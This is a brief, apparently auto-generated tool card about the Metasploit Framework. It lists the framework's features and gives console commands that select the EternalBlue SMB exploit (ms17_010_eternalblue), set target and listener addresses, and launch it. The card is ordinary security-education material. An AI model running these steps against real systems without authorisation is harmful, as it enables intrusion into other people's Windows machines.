# Metasploit Framework

**Purpose:** Most popular penetration testing framework with extensive exploit database.

**Key Features:**
- Large database of exploits and payloads
- Modular architecture
- Automated exploitation
- Post-exploitation modules
- Integration with Nmap, Nessus

**Essential Commands:**
```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows

# Use an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Set options
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50

# Exploit
msf6 exploit(ms17_010_eternalblue) > exploit
```

**Learn More:** [metasploit.com](https://www.metasploit.com)

---
*Generated automatically on 2026-06-27 as part of the CyberSec Daily Streak project.*

**Category:** Tools
**Security Status:** ✅ Content validated and sanitized
